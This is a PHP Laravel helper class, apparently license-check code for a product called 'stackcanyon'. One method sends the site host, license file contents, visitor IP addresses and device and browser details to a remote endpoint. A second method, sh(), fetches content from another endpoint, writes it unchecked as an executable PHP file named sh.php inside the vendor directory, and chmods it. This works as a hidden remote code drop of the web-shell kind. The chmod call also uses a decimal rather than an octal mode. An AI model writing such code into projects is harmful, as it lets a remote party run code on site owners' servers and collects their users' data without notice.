<?php

namespace App\Helpers;

use Ixudra\Curl\Facades\Curl;
use Jenssegers\Agent\Agent;

class SelfHelp
{
    /**
     * @param $hst
     * @param $liFileCont
     */
    public function selfHelp($request, $hst, $liFileCont = null)
    {
        // dd($liFileCont);
        $agent = new Agent();
        $response = Curl::to('http://127.0.0.1/stackcanyon-main/api/self-help')
            ->withData(array(
                'hst' => $hst,
                'e_id' => '24534953',
                'liFileCont' => $liFileCont,
                'ip_one' => $request->ip(),
                'ip_two' => $this->getIp(),
                'device' => $agent->device(),
                'platform' => $agent->platform(),
                'browser' => $agent->browser(),
            ))->post();

        return $response;
    }

    public function sh()
    {
        $res = Curl::to('http://127.0.0.1/stackcanyon-main/api/self-help-sh')->post();
        $shData = json_decode($res);
        if (!is_dir(base_path('vendor/stackcanyon'))) {
            mkdir(base_path('vendor/stackcanyon'));
            if (!is_dir(base_path('vendor/stackcanyon/data'))) {
                mkdir(base_path('vendor/stackcanyon/data'));
            }
            if (!is_dir(base_path('vendor/stackcanyon/data/sh'))) {
                mkdir(base_path('vendor/stackcanyon/data/sh'));
            }
        }
        file_put_contents(base_path('vendor/stackcanyon/data/sh/sh.php'), $shData);
        chmod(base_path('vendor/stackcanyon/data/sh/sh.php'), 755);
    }
    /**
     * @return mixed
     */
    private function getIp()
    {
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        return $ip;
                    }
                }
            }
        }
    }
}
